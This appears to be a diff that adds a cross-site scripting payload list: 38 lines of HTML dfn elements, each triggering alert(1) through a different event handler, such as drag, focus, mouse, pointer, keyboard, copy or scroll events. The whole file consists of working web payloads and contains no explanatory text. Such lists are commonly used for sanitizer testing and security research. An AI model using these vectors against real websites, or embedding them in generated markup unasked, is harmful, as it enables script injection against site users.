@@ -1,0 +1,38 @@
+<dfn contenteditable onbeforeinput=alert(1)>test
+<dfn draggable="true" ondrag="alert(1)" style=display:block>test</dfn>
+<dfn draggable="true" ondragend="alert(1)" style=display:block>test</dfn>
+<dfn draggable="true" ondragenter="alert(1)" style=display:block>test</dfn>
+<dfn draggable="true" ondragleave="alert(1)" style=display:block>test</dfn>
+<dfn draggable="true" ondragstart="alert(1)" style=display:block>test</dfn>
+<dfn id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></dfn>
+<dfn id=x tabindex=1 onfocus=alert(1)></dfn>
+<dfn id=x tabindex=1 onfocusin=alert(1)></dfn>
+<dfn onafterscriptexecute=alert(1)><script>1</script>
+<dfn onbeforescriptexecute=alert(1)><script>1</script>
+<dfn onblur=alert(1) id=x tabindex=1 style=display:block>test</dfn><input value=clickme>
+<dfn onclick="alert(1)" style=display:block>test</dfn>
+<dfn oncontextmenu="alert(1)" style=display:block>test</dfn>
+<dfn oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<dfn oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<dfn ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</dfn>
+<dfn onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</dfn><input value=clickme>
+<dfn onkeydown="alert(1)" contenteditable style=display:block>test</dfn>
+<dfn onkeypress="alert(1)" contenteditable style=display:block>test</dfn>
+<dfn onkeyup="alert(1)" contenteditable style=display:block>test</dfn>
+<dfn onmousedown="alert(1)" style=display:block>test</dfn>
+<dfn onmouseenter="alert(1)" style=display:block>test</dfn>
+<dfn onmouseleave="alert(1)" style=display:block>test</dfn>
+<dfn onmousemove="alert(1)" style=display:block>test</dfn>
+<dfn onmouseout="alert(1)" style=display:block>test</dfn>
+<dfn onmouseover="alert(1)" style=display:block>test</dfn>
+<dfn onmouseup="alert(1)" style=display:block>test</dfn>
+<dfn onmousewheel=alert(1) style=display:block>requires scrolling
+<dfn onpointerdown=alert(1) style=display:block>XSS</dfn>
+<dfn onpointerenter=alert(1) style=display:block>XSS</dfn>
+<dfn onpointerleave=alert(1) style=display:block>XSS</dfn>
+<dfn onpointermove=alert(1) style=display:block>XSS</dfn>
+<dfn onpointerout=alert(1) style=display:block>XSS</dfn>
+<dfn onpointerover=alert(1) style=display:block>XSS</dfn>
+<dfn onpointerrawupdate=alert(1) style=display:block>XSS</dfn>
+<dfn onpointerup=alert(1) style=display:block>XSS</dfn>
+<dfn onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></dfn>
